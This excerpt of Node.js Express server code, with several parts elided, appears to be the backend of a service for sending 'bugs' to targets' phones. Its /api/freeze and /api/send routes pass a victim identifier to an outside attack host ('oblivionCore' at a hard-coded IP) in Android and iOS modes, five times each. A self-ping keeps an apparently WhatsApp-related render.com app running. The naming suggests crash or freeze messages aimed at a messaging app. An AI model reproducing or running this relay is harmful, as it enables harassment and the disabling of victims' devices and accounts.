...
app.get('/api/freeze', async (req, res) => {
  ...
  if (!target || !type) return res.status(400).send('Missing ?target= & ?type=andros|ios');
  ...
  try {
    ...
    res.status(500).send({ error: 'BUG API failed', detail: err.response?.data || err.message });
  }
});

// --- Send Bug (combo logic) ---
app.get('/api/send', async (req, res) => {
  ...
  const andros = `http://159.223.50.150:2000/oblivionCore?target=${target}&mode=andros&username=${username}&key=${key}`;
  const ios = `http://159.223.50.150:2000/oblivionCore?target=${target}&mode=ios&username=${username}&key=${key}`;

  try {
    for (let i = 0; i < 5; i++) {
      await axios.get(andros);
      await axios.get(ios);
    }
    res.send({ success: true, message: `BUGs sent to ${target}` });
  } catch (err) {
    res.status(500).send({ error: 'BUG failed', detail: err.response?.data || err.message });
  }
});
...
// Auto Ping
setInterval(() => {
  axios.get('http://whatsapp-invi-api.onrender.com')
    .then(() => console.log('📡 Self-ping sent successfully'))
